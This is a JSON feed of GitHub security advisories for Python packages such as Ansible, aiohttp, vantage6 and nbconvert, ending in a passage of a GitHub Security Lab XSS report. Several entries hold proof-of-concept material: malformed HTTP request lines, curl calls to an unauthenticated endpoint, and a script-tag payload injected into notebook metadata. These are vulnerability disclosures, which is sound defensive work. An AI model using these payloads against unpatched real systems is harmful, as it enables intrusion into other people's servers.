{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>Ansible before 1.5.5 sets 0644 permissions for <code>sources.list</code>, which might allow local users to obtain sensitive credential information in opportunistic circumstances by reading a file that uses the <code>&amp;quot;deb http://user:pass@server:port/&amp;quot;</code> format.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-4659\">https://nvd.nist.gov/vuln/detail/CVE-2014-4659</a></li>\n<li><a href=\"https://github.com/ansible/ansible/blob/release1.5.5/CHANGELOG.md\">https://github.com/ansible/ansible/blob/release1.5.5/CHANGELOG.md</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/a0e027fe362fbc209dbeff2f72d6e95f39885c69\">https://github.com/ansible/ansible/commit/a0e027fe362fbc209dbeff2f72d6e95f39885c69</a></li>\n<li><a href=\"https://web.archive.org/web/20200229060001/https://www.securityfocus.com/bid/68234\">https://web.archive.org/web/20200229060001/https://www.securityfocus.com/bid/68234</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6667-f46p-pg88\">https://github.com/advisories/GHSA-6667-f46p-pg88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6667-f46p-pg88",
            "title": "[ansible] Ansible sets unsafe permissions for sources.list",
            "date_modified": "2024-01-31T00:03:36.000Z",
            "date_published": "2022-05-17T19:57:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6667-f46p-pg88"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Ansible before 1.6.7 does not prevent inventory data with \"{{\" and \"lookup\" substrings, and does not prevent remote data with \"{{\" substrings, which allows remote attackers to execute arbitrary code via (1) crafted lookup('pipe') calls or (2) crafted Jinja2 data.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-4966\">https://nvd.nist.gov/vuln/detail/CVE-2014-4966</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/62a1295a3e08cb6c3e9f1b2a1e6e5dcaeab32527\">https://github.com/ansible/ansible/commit/62a1295a3e08cb6c3e9f1b2a1e6e5dcaeab32527</a></li>\n<li><a href=\"http://www.ocert.org/advisories/ocert-2014-004.html\">http://www.ocert.org/advisories/ocert-2014-004.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wqq5-c89p-3wc3\">https://github.com/advisories/GHSA-wqq5-c89p-3wc3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wqq5-c89p-3wc3",
            "title": "[ansible] Ansible Arbitrary Code Execution",
            "date_modified": "2024-01-30T23:56:01.000Z",
            "date_published": "2022-05-17T19:57:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wqq5-c89p-3wc3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Multiple argument injection vulnerabilities in Ansible before 1.6.7 allow remote attackers to execute arbitrary code by leveraging access to an Ansible managed host and providing a crafted fact, as demonstrated by a fact with (1) a trailing \" src=\" clause, (2) a trailing \" temp=\" clause, or (3) a trailing \" validate=\" clause accompanied by a shell command.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-4967\">https://nvd.nist.gov/vuln/detail/CVE-2014-4967</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/62a1295a3e08cb6c3e9f1b2a1e6e5dcaeab32527\">https://github.com/ansible/ansible/commit/62a1295a3e08cb6c3e9f1b2a1e6e5dcaeab32527</a></li>\n<li><a href=\"http://www.ocert.org/advisories/ocert-2014-004.html\">http://www.ocert.org/advisories/ocert-2014-004.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-64cw-m57j-65xj\">https://github.com/advisories/GHSA-64cw-m57j-65xj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-64cw-m57j-65xj",
            "title": "[ansible] Ansible Arbitrary Code Execution",
            "date_modified": "2024-01-30T23:55:58.000Z",
            "date_published": "2022-05-17T19:57:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-64cw-m57j-65xj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>There are no checks on whether the input is encrypted if a task is created in an encrypted collaboration. Therefore, a user may accidentally create a task with sensitive input data that will then be stored unencrypted in a database.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>This is not an issue with the normal workflow, only if e.g. a user with the python client sets encryption to the wrong value.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vantage6/vantage6/security/advisories/GHSA-rjmv-52mp-gjrr\">https://github.com/vantage6/vantage6/security/advisories/GHSA-rjmv-52mp-gjrr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22193\">https://nvd.nist.gov/vuln/detail/CVE-2024-22193</a></li>\n<li><a href=\"https://github.com/vantage6/vantage6/commit/6383283733b81abfcacfec7538dc4dc882e98074\">https://github.com/vantage6/vantage6/commit/6383283733b81abfcacfec7538dc4dc882e98074</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rjmv-52mp-gjrr\">https://github.com/advisories/GHSA-rjmv-52mp-gjrr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rjmv-52mp-gjrr",
            "title": "[vantage6] vantage6 may create unencrypted tasks in encrypted collaboration",
            "date_modified": "2024-01-30T20:56:54.000Z",
            "date_published": "2024-01-30T20:56:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rjmv-52mp-gjrr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Nodes and servers get a ssh config by default that permits root login with password authentication. In a proper deployment, the SSH service is not exposed so there is no risk, but not all deployments are ideal. The default should therefore be less permissive.</p>\n<p>We will probably opt to completely remove the ssh option as it is only used for debugging. Later, we can add a debug mode where we can activate it if necessary.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Remove the ssh part from the docker file and build your own docker image</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vantage6/vantage6/security/advisories/GHSA-2wgc-48g2-cj5w\">https://github.com/vantage6/vantage6/security/advisories/GHSA-2wgc-48g2-cj5w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21653\">https://nvd.nist.gov/vuln/detail/CVE-2024-21653</a></li>\n<li><a href=\"https://github.com/vantage6/vantage6/commit/3fcc6e6a8bd1142fd7a558d8fdd2b246e55c8841\">https://github.com/vantage6/vantage6/commit/3fcc6e6a8bd1142fd7a558d8fdd2b246e55c8841</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2wgc-48g2-cj5w\">https://github.com/advisories/GHSA-2wgc-48g2-cj5w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2wgc-48g2-cj5w",
            "title": "[vantage6] vantage6 has insecure SSH configuration for node and server containers",
            "date_modified": "2024-01-30T20:56:50.000Z",
            "date_published": "2024-01-30T20:56:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2wgc-48g2-cj5w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>It is possible to find out usernames from the response time of login requests. This could aid attackers in credential attacks</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vantage6/vantage6/security/advisories/GHSA-45gq-q4xh-cp53\">https://github.com/vantage6/vantage6/security/advisories/GHSA-45gq-q4xh-cp53</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21671\">https://nvd.nist.gov/vuln/detail/CVE-2024-21671</a></li>\n<li><a href=\"https://github.com/vantage6/vantage6/commit/389f416c445da4f2438c72f34c3b1084485c4e30\">https://github.com/vantage6/vantage6/commit/389f416c445da4f2438c72f34c3b1084485c4e30</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-45gq-q4xh-cp53\">https://github.com/advisories/GHSA-45gq-q4xh-cp53</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-45gq-q4xh-cp53",
            "title": "[vantage6-server] vantage6 vulnerable to username timing attack",
            "date_modified": "2024-01-30T20:56:50.000Z",
            "date_published": "2024-01-30T20:56:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-45gq-q4xh-cp53"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Authenticated users could inject code into algorithm environment variables</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vantage6/vantage6/security/advisories/GHSA-w9h2-px87-74vx\">https://github.com/vantage6/vantage6/security/advisories/GHSA-w9h2-px87-74vx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21649\">https://nvd.nist.gov/vuln/detail/CVE-2024-21649</a></li>\n<li><a href=\"https://github.com/vantage6/vantage6/commit/eac19db737145d3ca987adf037a454fae0790ddd\">https://github.com/vantage6/vantage6/commit/eac19db737145d3ca987adf037a454fae0790ddd</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w9h2-px87-74vx\">https://github.com/advisories/GHSA-w9h2-px87-74vx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w9h2-px87-74vx",
            "title": "[vantage6] vantage6 remote code execution vulnerability",
            "date_modified": "2024-01-30T20:56:49.000Z",
            "date_published": "2024-01-30T20:56:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w9h2-px87-74vx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Vyper compiler allows passing a value in builtin <code>raw_call</code> even if the call is a <code>delegatecall</code> or a <code>staticcall</code>. But in the context of <code>delegatecall</code> and <code>staticcall</code> the handling of value is not possible due to the semantics of the respective opcodes, and vyper will silently ignore the <code>value=</code> argument.</p>\n<p>A contract search was performed and no vulnerable contracts were found in production.</p>\n<h3 id=\"details\">Details</h3>\n<p>The IR for <code>raw_call</code> is built in the <code>RawCall</code> class:\n<a href=\"https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/builtins/functions.py#L1100\">https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/builtins/functions.py#L1100</a></p>\n<p>However, the compiler doesn't validate that if either <code>delegatecall</code> or <code>staticall</code> are provided as kwargs, that <code>value</code> wasn't set. For example, the following compiles without errors:</p>\n<pre><code class=\"language-python\">raw_call(self, call_data2, max_outsize=255, is_delegate_call=True, value=msg.value/2)\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>If the semantics of the EVM are unknown to the developer, he could suspect that by specifying the <code>value</code> kwarg, exactly the given amount will be sent along to the target. However in fact, no <code>value</code> will be sent.</p>\n<p>Here is an example of an potentially problematic implementation of multicall utilizing the <code>raw_call</code> built-in:</p>\n<pre><code class=\"language-python\">value_accumulator: uint256 = empty(uint256)\n    results: DynArray[Result, max_value(uint8)] = []\n    return_data: Bytes[max_value(uint8)] = b\"\"\n    success: bool = empty(bool)\n    for batch in data:\n        msg_value: uint256 = batch.value\n        value_accumulator = unsafe_add(value_accumulator, msg_value)\n        if (batch.allow_failure == False):\n            return_data = raw_call(self, batch.call_data, max_outsize=255, value=msg_value, is_delegate_call=True)\n            success = True\n            results.append(Result({success: success, return_data: return_data}))\n        else:\n            success, return_data = \\\n                raw_call(self, batch.call_data, max_outsize=255, value=msg_value, is_delegate_call=True, revert_on_failure=False)\n            results.append(Result({success: success, return_data: return_data}))\n    assert msg.value == value_accumulator, \"Multicall: value mismatch\"\n    return results\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-x2c2-q32w-4w6m\">https://github.com/vyperlang/vyper/security/advisories/GHSA-x2c2-q32w-4w6m</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/builtins/functions.py#L1100\">https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/builtins/functions.py#L1100</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24567\">https://nvd.nist.gov/vuln/detail/CVE-2024-24567</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x2c2-q32w-4w6m\">https://github.com/advisories/GHSA-x2c2-q32w-4w6m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x2c2-q32w-4w6m",
            "title": "[vyper] Vyper's raw_call `value=` kwargs not disabled for static and delegate calls",
            "date_modified": "2024-01-30T21:34:13.000Z",
            "date_published": "2024-01-30T18:42:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x2c2-q32w-4w6m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Improperly configuring static resource resolution in aiohttp when used as a web server can result in the unauthorized reading of arbitrary files on the system.</p>\n<h3 id=\"details\">Details</h3>\n<p>When using aiohttp as a web server and configuring static routes, it is necessary to specify the root path for static files. Additionally, the option 'follow_symlinks' can be used to determine whether to follow symbolic links outside the static root directory. When 'follow_symlinks' is set to True, there is no validation to check if a given file path is within the root directory.This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system, even when symlinks are not present.</p>\n<p>i.e. An application is only vulnerable with setup code like:</p>\n<pre><code>app.router.add_routes([\n    web.static(\"/static\", \"static/\", follow_symlinks=True),  # Remove follow_symlinks to avoid the vulnerability\n])\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a directory traversal vulnerability with CWE ID 22. When using aiohttp as a web server and enabling static resource resolution with <code>follow_symlinks</code> set to True, it can lead to this vulnerability. This vulnerability has been present since the introduction of the <code>follow_symlinks</code> parameter.</p>\n<h3 id=\"workaround\">Workaround</h3>\n<p>Even if upgrading to a patched version of aiohttp, we recommend following these steps regardless.</p>\n<p>If using <code>follow_symlinks=True</code> outside of a restricted local development environment, disable the option immediately. This option is NOT needed to follow symlinks which point to a location <em>within</em> the static root directory, it is <em>only</em> intended to allow a symlink to break out of the static directory. Even with this CVE fixed, there is still a substantial risk of misconfiguration when using this option on a server that accepts requests from remote users.</p>\n<p>Additionally, aiohttp has always recommended using a reverse proxy server (such as nginx) to handle static resources and <em>not</em> to use these static resources in aiohttp for production environments. Doing so also protects against this vulnerability, and is why we expect the number of affected users to be very low.</p>\n<hr>\n<p>Patch: <a href=\"https://github.com/aio-libs/aiohttp/pull/8079/files\">https://github.com/aio-libs/aiohttp/pull/8079/files</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f\">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/pull/8079/files\">https://github.com/aio-libs/aiohttp/pull/8079/files</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/commit/1c335944d6a8b1298baf179b7c0b3069f10c514b\">https://github.com/aio-libs/aiohttp/commit/1c335944d6a8b1298baf179b7c0b3069f10c514b</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23334\">https://nvd.nist.gov/vuln/detail/CVE-2024-23334</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/pull/8079\">https://github.com/aio-libs/aiohttp/pull/8079</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5h86-8mv2-jq9f\">https://github.com/advisories/GHSA-5h86-8mv2-jq9f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5h86-8mv2-jq9f",
            "title": "[aiohttp] aiohttp is vulnerable to directory traversal",
            "date_modified": "2024-01-30T16:12:22.000Z",
            "date_published": "2024-01-29T22:31:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5h86-8mv2-jq9f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Security-sensitive parts of the <em>Python HTTP parser</em> retained minor differences in allowable character sets, that must trigger error handling to robustly match frame boundaries of proxies in order to protect against injection of additional requests. Additionally, validation could trigger exceptions that were not handled consistently with processing of other malformed input.</p>\n<h3 id=\"details\">Details</h3>\n<p>These problems are rooted in pattern matching protocol elements, previously improved by PR #3235 and GHSA-gfw2-4jvh-wgfg:</p>\n<ol>\n<li><p>The expression <code>HTTP/(\\d).(\\d)</code> lacked another backslash to clarify that the separator should be a literal dot, not just <em>any</em> Unicode code point (result: <code>HTTP/(\\d)\\.(\\d)</code>).</p>\n</li>\n<li><p>The HTTP version was permitting Unicode digits, where only ASCII digits are standards-compliant.</p>\n</li>\n<li><p>Distinct regular expressions for validating HTTP Method and Header field names were used - though both should (at least) apply the common restrictions of rfc9110 <code>token</code>.</p>\n</li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<p><code>GET / HTTP/1ö1</code>\n<code>GET / HTTP/1.𝟙</code>\n<code>GET/: HTTP/1.1</code>\n<code>Content-Encoding?: chunked</code></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Primarily concerns running an aiohttp server without llhttp:</p>\n<ol>\n<li><strong>behind a proxy</strong>: Being more lenient than internet standards require could, depending on deployment environment, assist in request smuggling.</li>\n<li><strong>directly accessible</strong> or exposed behind proxies relaying malformed input: the unhandled exception could cause excessive resource consumption on the application server and/or its logging facilities.</li>\n</ol>\n<hr>\n<p>Patch: <a href=\"https://github.com/aio-libs/aiohttp/pull/8074/files\">https://github.com/aio-libs/aiohttp/pull/8074/files</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-8qpw-xqxj-h4r2\">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-8qpw-xqxj-h4r2</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg\">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/pull/3235\">https://github.com/aio-libs/aiohttp/pull/3235</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/pull/8074/files\">https://github.com/aio-libs/aiohttp/pull/8074/files</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/commit/33ccdfb0a12690af5bb49bda2319ec0907fa7827\">https://github.com/aio-libs/aiohttp/commit/33ccdfb0a12690af5bb49bda2319ec0907fa7827</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23829\">https://nvd.nist.gov/vuln/detail/CVE-2024-23829</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/pull/8074\">https://github.com/aio-libs/aiohttp/pull/8074</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8qpw-xqxj-h4r2\">https://github.com/advisories/GHSA-8qpw-xqxj-h4r2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8qpw-xqxj-h4r2",
            "title": "[aiohttp] aiohttp's HTTP parser (the python one, not llhttp) still overly lenient about separators",
            "date_modified": "2024-01-30T16:11:57.000Z",
            "date_published": "2024-01-29T22:30:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8qpw-xqxj-h4r2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>API endpoint <code>/api/v1/watch/&lt;uuid&gt;/history</code> can be accessed by any unauthorized user.</p>\n<h3 id=\"details\">Details</h3>\n<p>WatchHistory resource does not have <code>@auth.check_token</code> annotation, which means it can be accessed without providing <code>x-api-key</code> header.</p>\n<p><a href=\"https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156\">https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Get list of watch with <code>x-api-key</code>:</li>\n</ol>\n<pre><code class=\"language-sh\">$ curl -H \"x-api-key: apikeyhere\" http://localhost:5000/api/v1/watch\n{\"uuid\": ...}\n</code></pre>\n<ol start=\"2\">\n<li>Call for history of snapshots without <code>x-api-key</code>. Expected - 401/403 error. Actual - list of snapshots is listed.</li>\n</ol>\n<pre><code class=\"language-sh\">$ curl http://localhost:5000/api/v1/watch/uuid/history\n{\"timestamp\": \"/path/to/snapshot.txt\"}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Anybody can check one's watch history. However, because unauthorized party first needs to know watch UUID, and the watch history endpoint itself returns only paths to the snapshot on the server, an impact on users' data privacy is minimal.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-hcvp-2cc7-jrwr\">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-hcvp-2cc7-jrwr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23329\">https://nvd.nist.gov/vuln/detail/CVE-2024-23329</a></li>\n<li><a href=\"https://github.com/dgtlmoon/changedetection.io/commit/402f1e47e78ecd155b1e90f30cce424ff7763e0f\">https://github.com/dgtlmoon/changedetection.io/commit/402f1e47e78ecd155b1e90f30cce424ff7763e0f</a></li>\n<li><a href=\"https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156\">https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/changedetection-io/PYSEC-2024-15.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/changedetection-io/PYSEC-2024-15.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hcvp-2cc7-jrwr\">https://github.com/advisories/GHSA-hcvp-2cc7-jrwr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hcvp-2cc7-jrwr",
            "title": "[changedetection-io] changedetection.io API endpoint is not secured with API token",
            "date_modified": "2024-01-27T00:31:49.000Z",
            "date_published": "2024-01-23T12:50:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hcvp-2cc7-jrwr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Most of the fixes will be in this repo, though, so having it here gives us the private fork to work on patches</p>\n<p>Below is currently a duplicate of the original report:</p>\n<hr>\n<p>Received on <a href=\"mailto:security@ipython.org\">security@ipython.org</a> unedited, I'm not sure if we want to make it separate advisories. </p>\n<p>Pasted raw for now, feel free to edit or make separate advisories if you have the rights to. </p>\n<h2 id=\"i-think-the-most-important-is-to-switch-back-from-nbviewerjupyterorg---nbviewerorg-at-the-cloudflare-level-i-guess--there-might-be-fastly-involved-as-well\">I think the most important is to switch back from nbviewer.jupyter.org -&gt; nbviewer.org at the cloudflare level I guess ? There might be fastly involved as well.</h2>\n<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"http://example.com\">example link to repo</a></li>\n<li>Email us at <a href=\"mailto:example@example.com\">example email address</a></li>\n</ul>\n<hr>\n<h1 id=\"github-security-lab-ghsl-vulnerability-report\">GitHub Security Lab (GHSL) Vulnerability Report</h1>\n<p>The <a href=\"https://securitylab.github.com\">GitHub Security Lab</a> team has identified potential security vulnerabilities in <a href=\"https://github.com/jupyter/nbconvert\">nbconvert</a>.</p>\n<p>We are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.</p>\n<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2021-1013</code>, <code>GHSL-2021-1014</code>, <code>GHSL-2021-1015</code>, <code>GHSL-2021-1016</code>, <code>GHSL-2021-1017</code>, <code>GHSL-2021-1018</code>, <code>GHSL-2021-1019</code>, <code>GHSL-2021-1020</code>, <code>GHSL-2021-1021</code>, <code>GHSL-2021-1022</code>, <code>GHSL-2021-1023</code>, <code>GHSL-2021-1024</code>, <code>GHSL-2021-1025</code>, <code>GHSL-2021-1026</code>, <code>GHSL-2021-1027</code> or <code>GHSL-2021-1028</code> as a reference).</p>\n<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>\n<h2 id=\"summary\">Summary</h2>\n<p>When using nbconvert to generate an HTML version of a user-controllable notebook, it is possible to inject arbitrary HTML which may lead to Cross-Site Scripting (XSS) vulnerabilities if these HTML notebooks are served by a web server (eg: nbviewer) </p>\n<h2 id=\"product\">Product</h2>\n<p>nbconvert</p>\n<h2 id=\"tested-version\">Tested Version</h2>\n<p><a href=\"https://github.com/jupyter/nbconvert/releases/tag/5.5.0\">v5.5.0</a></p>\n<h2 id=\"details\">Details</h2>\n<h3 id=\"issue-1-xss-in-notebookmetadatalanguage_infopygments_lexer-ghsl-2021-1013\">Issue 1: XSS in notebook.metadata.language_info.pygments_lexer (<code>GHSL-2021-1013</code>)</h3>\n<p>Attacker in control of a notebook can inject arbitrary unescaped HTML in the <code>notebook.metadata.language_info.pygments_lexer</code> field such as the following:</p>\n<pre><code class=\"language-json\">\"metadata\": {\n  \"language_info\": {\n   \"pygments_lexer\": \"ipython3-foo\\\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"\n  }\n}\n</code></pre>\n<p>This node is read in the <a href=\"https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/exporters/html.py#L135-L140\"><code>from_notebook_node</code></a> method:</p>\n<pre><code class=\"language-python\">def from_notebook_node(self, nb, resources=None, **kw):\n  langinfo = nb.metadata.get('language_info', {})\n  lexer = langinfo.get('pygments_lexer', langinfo.get('name', None))\n  highlight_code = self.filters.get('highlight_code', Highlight2HTML(pygments_lexer=lexer, parent=self))\n  self.register_filter('highlight_code', highlight_code)\n  return super().from_notebook_node(nb, resources, **kw)\n</code></pre>\n<p>It is then assigned to <code>language</code> var and passed down to <a href=\"https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/filters/highlight.py#L90\"><code>_pygments_highlight</code></a></p>\n<pre><code class=\"language-python\">from pygments.formatters import LatexFormatter\nif not language:\n  language=self.pygments_lexer\nlatex = _pygments_highlight(source, LatexFormatter(), language, metadata)\n</code></pre>\n<p>In this method, the <code>language</code> variable is <a href=\"https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/filters/highlight.py#L56\">concatenated to <code>highlight hl-</code> string to conform the <code>cssclass</code></a> passed to the <code>HTMLFormatter</code> constructor:</p>\n<pre><code class=\"language-python\">return _pygments_highlight(source if len(source) &gt; 0 else ' ',\n  # needed to help post processors:\n  HtmlFormatter(cssclass=\" highlight hl-\"+language),\n  language, metadata)\n</code></pre>\n<p>The <code>cssclass</code> variable is then <a href=\"https://github.com/pygments/pygments/blob/30cfa26201a27dee1f8e6b0d600cad1138e64507/pygments/formatters/html.py#L791\">concatenated in the outer div class attribute</a></p>\n<pre><code class=\"language-python\">yield 0, ('&lt;div' + (self.cssclass and ' class=\"%s\"' % self.cssclass) + (style and (' style=\"%s\"' % style)) + '&gt;')\n</code></pre>\n<p>Note that the <code>cssclass</code> variable is also used in other unsafe places such as <a href=\"https://github.com/pygments/pygments/blob/30cfa26201a27dee1f8e6b0d600cad1138e64507/pygments/formatters/html.py#L711\"><code>'&lt;table class=\"%stable\"&gt;' % self.cssclass + filename_tr +</code></a>)</p>\n<h3 id=\"issue-2-xss-in-notebookmetadatatitle-ghsl-2021-1014\">Issue 2: XSS in notebook.metadata.title (<code>GHSL-2021-1014</code>)</h3>\n<p>The <code>notebook.metadata.title</code> node is rendered directly to the <a 